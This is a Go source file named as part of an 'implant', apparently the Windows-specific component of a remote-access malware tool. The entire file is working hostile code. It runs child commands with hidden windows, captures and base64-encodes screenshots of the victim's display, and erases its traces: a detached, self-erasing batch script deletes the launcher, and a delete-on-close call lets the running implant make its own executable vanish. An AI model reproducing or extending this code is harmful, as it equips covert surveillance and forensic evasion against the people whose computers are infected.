// implant/exec_attrs_windows.go
//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/png" // Or image/jpeg
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows"
)

// Windows API Constants for SetFileInformationByHandle with FileDispositionInformationEx
const (
	fileDispositionInformationExClass = 64 // From FILE_INFO_BY_HANDLE_CLASS enumeration
	fileDispositionFlagDelete         = 0x00000001
	fileDispositionFlagPosixSemantics = 0x00000002
)

// fileDispositionInfoEx structure corresponds to FILE_DISPOSITION_INFO_EX
type fileDispositionInfoEx struct {
	Flags uint32
}

func init() {
	doSelfDelete = doSelfDeleteWindows
	setOSSpecificAttrs = setOSSpecificAttrsWindows
	takeScreenshot = takeScreenshotWindows
}

func setOSSpecificAttrsWindows(cmd *exec.Cmd) {
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
}

func takeScreenshotWindows() (string, error) {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return "", fmt.Errorf("no active displays found")
	}

	bounds := screenshot.GetDisplayBounds(0) // Capture primary display
	if bounds.Dx() == 0 || bounds.Dy() == 0 {
		// Attempt to find any valid display if primary is problematic
		for i := 0; i < n; i++ {
			b := screenshot.GetDisplayBounds(i)
			if b.Dx() > 0 && b.Dy() > 0 {
				bounds = b
				break
			}
		}
		if bounds.Dx() == 0 || bounds.Dy() == 0 {
			return "", fmt.Errorf("failed to get valid display bounds for any display")
		}
	}

	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return "", fmt.Errorf("failed to capture screen: %w", err)
	}

	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil { // Ensure png.Encode is used
		return "", fmt.Errorf("failed to encode png: %w", err)
	}

	imgBase64Str := base64.StdEncoding.EncodeToString(buf.Bytes())
	return imgBase64Str, nil
}

// deleteFileViaBatch spawns a detached batch script to delete the specified file.
// The delay is now handled in Go before spawning the batch.
func deleteFileViaBatch(targetFilePath string) {
	if targetFilePath == "" {
		// fmt.Printf("Debug: deleteFileViaBatch: targetFilePath is empty. Skipping.\n")
		return
	}
	absTargetFilePath, err := filepath.Abs(targetFilePath)
	if err != nil {
		// fmt.Printf("Debug: deleteFileViaBatch: Failed to get abs path for %s: %v\n", targetFilePath, err)
		return
	}

	// Check if file exists before attempting deletion.
	// This is important to avoid trying to delete a non-existent file and
	// also to avoid creating/running a batch script if there's nothing to do.
	if _, statErr := os.Stat(absTargetFilePath); os.IsNotExist(statErr) {
		// fmt.Printf("Debug: deleteFileViaBatch: Target file %s does not exist. Skipping deletion.\n", absTargetFilePath)
		return
	}

	// MODIFICATION: Introduce a delay in the Go program itself before creating and running the batch script.
	// This allows the original launcher process (if it's the target) more time to fully exit
	// and release any handles before the batch script attempts deletion.
	// This delay is silent as it's handled by Go's time.Sleep().
	// fmt.Printf("Debug: deleteFileViaBatch: Delaying for 2 seconds before creating delete batch for %s\n", absTargetFilePath)
	//time.Sleep(0 * time.Second)

	// Simplified batchContent: No internal delay command (like ping or timeout) needed.
	// chcp 65001 is for UTF-8 paths, good to keep if paths might contain non-ASCII.
	// setlocal is good practice for batch scripts.
	batchContent := fmt.Sprintf(`@echo off
chcp 65001 > nul
setlocal
:: Attempt to delete the target file. The delay has already occurred in the parent Go process.
del /F /Q "%s"
:: Delete this batch script itself
(goto) 2>nul & del "%%~f0"
exit /b
`, absTargetFilePath)

	tempDir := os.TempDir()
	// More unique batch file name
	batchFileName := fmt.Sprintf("del_file_proc%d_time%d.bat", os.Getpid(), time.Now().UnixNano())
	batchFilePath := filepath.Join(tempDir, batchFileName)

	// fmt.Printf("Debug: deleteFileViaBatch: Writing batch script to %s for deleting %s\n", batchFilePath, absTargetFilePath)
	err = os.WriteFile(batchFilePath, []byte(batchContent), 0700)
	if err != nil {
		// fmt.Printf("Debug: deleteFileViaBatch: Failed to write batch file %s: %v\n", batchFilePath, err)
		return // If we can't write the batch, don't proceed
	}

	cmd := exec.Command("cmd.exe", "/C", batchFilePath)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000 | 0x00000008, // CREATE_NO_WINDOW | DETACHED_PROCESS
	}

	// fmt.Printf("Debug: deleteFileViaBatch: Starting batch delete for %s via %s\n", absTargetFilePath, batchFilePath)
	if err := cmd.Start(); err == nil {
		if cmd.Process != nil { // cmd.Start() succeeded, so cmd.Process should be populated
			_ = cmd.Process.Release() // Detach from the child process
		}
		// fmt.Printf("Debug: deleteFileViaBatch: Successfully started and detached batch delete for %s via %s\n", absTargetFilePath, batchFilePath)
	} else {
		// fmt.Printf("Debug: deleteFileViaBatch: Failed to start batch delete for %s: %v. Cleaning up batch script.\n", absTargetFilePath, err)
		_ = os.Remove(batchFilePath) // Clean up the batch script if we failed to start it
	}
}

// markFileForDeleteOnCloseAndPosixSemantics marks the specified file for deletion using Windows API.
// The file will be deleted when the last handle to it is closed.
// With POSIX_SEMANTICS, new attempts to open the file should fail as if it's not there.
func markFileForDeleteOnCloseAndPosixSemantics(filePath string) error {
	if filePath == "" {
		return fmt.Errorf("filePath cannot be empty for markFileForDeleteOnCloseAndPosixSemantics")
	}
	absFilePath, err := filepath.Abs(filePath)
	if err != nil {
		return fmt.Errorf("filepath.Abs for %s failed: %w", filePath, err)
	}

	// Check if file exists before attempting to mark
	if _, statErr := os.Stat(absFilePath); os.IsNotExist(statErr) {
		// fmt.Printf("Debug: markFile...: Target file %s does not exist. Skipping marking.\n", absFilePath)
		return nil // Not an error if file already gone
	}

	pwcPath, err := windows.UTF16PtrFromString(absFilePath)
	if err != nil {
		return fmt.Errorf("UTF16PtrFromString failed for %s: %w", absFilePath, err)
	}

	// FILE_SHARE_DELETE is crucial. We need DELETE access to mark for deletion.
	handle, err := windows.CreateFile(
		pwcPath,
		windows.DELETE, // Request DELETE access right.
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return fmt.Errorf("CreateFile with DELETE access failed for %s: %w. (Is it already marked or locked by another process without share-delete?)", absFilePath, err)
	}
	defer windows.CloseHandle(handle)

	// FILE_DISPOSITION_INFO_EX structure using FILE_DISPOSITION_FLAG_DELETE and FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
	disposition := fileDispositionInfoEx{
		Flags: fileDispositionFlagDelete | fileDispositionFlagPosixSemantics,
	}

	// FileDispositionInformationEx class is 64
	err = windows.SetFileInformationByHandle(handle, fileDispositionInformationExClass, (*byte)(unsafe.Pointer(&disposition)), uint32(unsafe.Sizeof(disposition)))
	if err != nil {
		return fmt.Errorf("SetFileInformationByHandle with POSIX semantics failed for %s: %w", absFilePath, err)
	}
	// fmt.Printf("Debug: Successfully marked %s for delete on close with POSIX semantics.\n", absFilePath)
	return nil
}

// doSelfDeleteWindows is called by the currently running implant (daemon).
// selfExePath: path to the implant's own executable file.
// originalLauncherPath: path to the initial executable that launched the implant.
func doSelfDeleteWindows(selfExePath string, originalLauncherPath string) {
	// Phase 1: Delete the original launcher file via a detached batch script.
	// This is for the file that initially started the chain, which should have exited.
	// The delay is now handled inside deleteFileViaBatch before the batch script is created/run.
	if originalLauncherPath != "" && originalLauncherPath != selfExePath {
		// fmt.Printf("Debug: doSelfDeleteWindows: Attempting to delete original launcher: %s\n", originalLauncherPath)
		deleteFileViaBatch(originalLauncherPath)
	} else {
		// fmt.Printf("Debug: doSelfDeleteWindows: Original launcher path is empty or same as self, not deleting: %s\n", originalLauncherPath)
	}

	// Phase 2: Mark the implant's own executable file (selfExePath) for delete-on-close with POSIX semantics.
	// The implant process itself will continue running. The file is marked for deletion.
	// fmt.Printf("Debug: doSelfDeleteWindows: Attempting to mark self for deletion: %s\n", selfExePath)
	if err := markFileForDeleteOnCloseAndPosixSemantics(selfExePath); err != nil {
		// fmt.Printf("Warning: Failed to mark self (%s) for delete on close: %v. The implant will continue to run, but its file might not be deleted upon exit.\n", selfExePath, err)
		// This is a non-fatal error for the implant's continued operation.
	}

	// The implant continues running. This function does NOT call os.Exit(0).
}
